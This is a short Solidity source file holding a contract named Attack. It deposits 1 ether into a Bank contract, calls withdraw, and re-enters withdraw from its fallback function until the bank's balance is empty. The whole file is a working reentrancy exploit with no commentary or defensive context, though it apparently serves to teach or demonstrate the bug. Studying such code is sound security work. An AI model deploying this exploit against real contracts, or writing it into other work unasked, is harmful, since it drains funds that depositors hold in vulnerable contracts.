pragma solidity 0.8.17;

import { Bank } from "./Bank.sol";

contract Attack {
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() payable external {
        Bank(bank).deposit{value: 1 ether} ();
        Bank(bank).withdraw();
    }

    fallback() payable external {
        if (bank.balance > 0) {
            Bank(bank).withdraw();
        }
    }
}
